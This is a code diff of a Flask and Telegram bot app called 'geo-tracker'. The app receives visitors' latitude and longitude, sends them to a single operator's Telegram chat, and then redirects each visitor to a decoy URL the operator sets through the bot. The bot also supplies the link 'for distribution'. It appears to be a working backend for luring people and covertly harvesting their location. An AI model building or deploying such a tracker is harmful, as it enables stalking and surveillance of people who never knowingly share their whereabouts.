@@ -1,7 +1,6 @@
-from flask import Flask, request, send_from_directory
+from flask import Flask, request, send_from_directory, redirect
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
-import threading
+from telebot import types
 import os
 
 app = Flask(__name__, static_folder='static')
@@ -11,19 +10,14 @@ CHAT_ID = 651911888  # Только ты можешь пользоваться �
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# URL для webhook с твоим адресом Render
-WEBHOOK_URL = f"https://geo-tracker-l5ui.onrender.com/{BOT_TOKEN}"
+# --- Переменные ---
+RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'  # Ссылка на твой сайт
+redirect_url = "https://example.com"  # URL по умолчанию, на который редиректим после гео
+user_waiting_for_url = set()  # Кто сейчас вводит новую ссылку
 
-# Переменная для редиректа, можно менять через бота
-redirect_url = "https://example.com"  # Начальный URL редиректа
+# --- Flask часть ---
 
-# --- Функция для отправки координат в Telegram ---
-def send_to_telegram(lat, lon):
-    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
-    bot.send_message(CHAT_ID, text)
-
-# --- Flask роуты ---
-@app.route('/')
+@app.route("/")
 def serve_index():
     return send_from_directory(app.static_folder, 'index.html')
 
@@ -33,62 +27,70 @@ def send_location():
     lat = data.get("latitude")
     lon = data.get("longitude")
     if lat and lon:
-        send_to_telegram(lat, lon)
+        bot.send_message(CHAT_ID, f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}")
         return {"status": "ok"}
     return {"status": "error"}, 400
 
-# --- Telegram бот команды и кнопки ---
+@app.route("/redirect")
+def geo_redirect():
+    return redirect(redirect_url)
+
+# --- Bot часть ---
+
+def set_redirect_url(url):
+    global redirect_url
+    redirect_url = url
 
 def check_user(message):
-    return message.from_user.id == CHAT_ID
+    return message.chat.id == CHAT_ID
 
-@bot.message_handler(commands=['start'])
+@bot.message_handler(commands=['start', 'help'])
 def send_welcome(message):
     if not check_user(message):
-        bot.reply_to(message, "🚫 Доступ запрещен.")
+        bot.reply_to(message, "🚫 Доступ запрещён.")
         return
-    markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("Изменить редирект", callback_data="change_redirect"))
-    markup.add(InlineKeyboardButton("Скинуть ссылку на Render", callback_data="send_link"))
-    bot.send_message(CHAT_ID, "Привет! Выбирай действие:", reply_markup=markup)
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.row('Изменить редирект', 'Скинуть ссылку')
+    bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)
 
-@bot.callback_query_handler(func=lambda call: True)
-def callback_inline(call):
-    global redirect_url
-
-    if call.from_user.id != CHAT_ID:
-        bot.answer_callback_query(call.id, "🚫 Доступ запрещен.")
-        return
-
-    if call.data == "change_redirect":
-        msg = bot.send_message(CHAT_ID, "Введи новый URL для редиректа:")
-        bot.register_next_step_handler(msg, process_redirect_url)
-
-    elif call.data == "send_link":
-        bot.send_message(CHAT_ID, f"Вот твоя ссылка на Render:\n{redirect_url}")
-
-def process_redirect_url(message):
-    global redirect_url
+@bot.message_handler(func=lambda m: m.text == 'Изменить редирект')
+def ask_redirect(message):
     if not check_user(message):
-        bot.reply_to(message, "🚫 Доступ запрещен.")
+        return
+    bot.send_message(message.chat.id, "Пришли новую ссылку для редиректа (начиная с http:// или https://):")
+    user_waiting_for_url.add(message.chat.id)
+
+@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url)
+def set_redirect_from_message(message):
+    if not check_user(message):
         return
     url = message.text.strip()
-    redirect_url = url
-    bot.send_message(CHAT_ID, f"Редирект обновлен на:\n{redirect_url}")
+    if url.startswith('http://') or url.startswith('https://'):
+        set_redirect_url(url)
+        bot.send_message(message.chat.id, f"✅ Редирект установлен на:\n{url}")
+        user_waiting_for_url.remove(message.chat.id)
+    else:
+        bot.send_message(message.chat.id, "❌ Ошибка: ссылка должна начинаться с http:// или https://. Попробуй ещё раз.")
 
-# --- Webhook handler ---
+@bot.message_handler(func=lambda m: m.text == 'Скинуть ссылку')
+def send_render_link(message):
+    if not check_user(message):
+        return
+    bot.send_message(message.chat.id, f"🌐 Вот твоя ссылка для рассылки:\n{RENDER_URL}")
+
+# --- Webhook (если нужен) ---
+
 @app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def webhook():
-    json_str = request.get_data().decode("utf-8")
-    update = telebot.types.Update.de_json(json_str)
+    update = telebot.types.Update.de_json(request.stream.read().decode("utf-8"))
     bot.process_new_updates([update])
     return "", 200
 
 if __name__ == "__main__":
-    # Снимаем старый webhook (если есть)
+    # Убираем старый webhook, если был
     bot.remove_webhook()
-    # Устанавливаем webhook на твой URL
-    bot.set_webhook(url=WEBHOOK_URL)
+    # Устанавливаем webhook на свой рендер
+    bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
 
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
